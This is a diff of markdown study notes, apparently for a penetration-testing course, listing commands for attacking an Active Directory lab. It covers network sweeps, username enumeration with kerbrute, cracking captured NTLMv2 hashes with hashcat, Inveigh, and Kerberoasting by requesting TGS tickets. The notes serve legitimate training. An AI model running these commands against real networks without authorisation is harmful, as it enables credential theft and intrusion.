@@ -1,86 +1,68 @@
+---
+tags:
+  - nslookup
+  - responder
+  - fping
+  - tcpdump
+  - pcredz
+  - kerberos
+  - kerbrute
+  - llmnr
+  - nbtns
+  - rpcclient
+  - enum4linux
+  - ldapsearch
+  - netexec
+course: CPTS
+---
+
 # Initial Enumeration 
 
-Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.
+Query domain name -> IP mapping
 
 ```
 nslookup ns1.inlanefreight.com
 ```
 
-Used to start capturing network packets on the network interface proceeding the `-i` option a Linux-based host.
+Capture network traffic
 
 ```
 sudo tcpdump -i ens224
 ```
 
-Used to start responding to & analyzing `LLMNR`, `NBT-NS` and `MDNS` queries on the interface specified proceeding the` -I` option and operating in `Passive Analysis` mode which is activated using `-A`. Performed from a Linux-based host
+Start `responder` in analyze mode -- no poisoned responses are sent
 
 ```
 sudo responder -I ens224 -A
 ```
 
-Performs a ping sweep on the specified network segment from a Linux-based host.
+Performs a ping sweep on the specified network segment
 
 ```
 fping -asgq 172.16.5.0/23
 ```
 
-Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (`-A`) based on a list of hosts (`hosts.txt`) specified in the file proceeding `-iL`. Then outputs the scan results to the file specified after the `-oN`option. Performed from a Linux-based host
+Nmap scan with all output
 
 ```
-sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum
+sudo nmap -v -A -iL hosts.txt -oA /home/User/Documents/host-enum
 ```
 
-Uses `git` to clone the kerbrute tool from a Linux-based host.
+Run kerbrute to find valid usernames
 
 ```
-sudo git clone https://github.com/ropnop/kerbrute.git
-```
-
-Used to list compiling options that are possible with `make` from a Linux-based host.
-
-```
-make help
-```
-
-Used to compile a `Kerbrute` binary for multiple OS platforms and CPU architectures.
-
-```
-sudo make all
-```
-
-Used to test the chosen complied `Kebrute` binary from a Linux-based host.
-
-```
-./kerbrute_linux_amd64
-```
-
-Used to move the `Kerbrute` binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.
-
-```
-sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
-```
-
-Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host.
-
-```
-./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
 ```
 
 # LLMNR/NTB-NS Poisoning 
 
-Used to display the usage instructions and various options available in `Responder` from a Linux-based host.
-
-```
-responder -h
-```
-
-Uses `hashcat` to crack `NTLMv2` (`-m`) hashes that were captured by responder and saved in a file (`frond_ntlmv2`). The cracking is done based on a specified wordlist.
+Crack NTLMv2 hashes
 
 ```
 hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
 ```
 
-Using the `Import-Module` PowerShell cmd-let to import the Windows-based tool `Inveigh.ps1`.
+Import Inveigh.ps1
 
 ```
 Import-Module .\Inveigh.ps1
@@ -644,25 +626,13 @@ impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password
 
 # Kerberoasting 
 
-Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.
-
-```
-sudo python3 -m pip install .
-```
-
-Impacket tool used to display the options and functionality of `GetUserSPNs.py` from a Linux-based host.
-
-```
-GetUserSPNs.py -h
-```
-
-Impacket tool used to get a list of `SPNs` on the target Windows domain from  a Linux-based host.
+Get a list of SPNs
 
 ```
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday
 ```
 
-Impacket tool used to download/request (`-request`) all TGS tickets for offline processing from a Linux-based host.
+Get all TGS tickets
 
 ```
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request
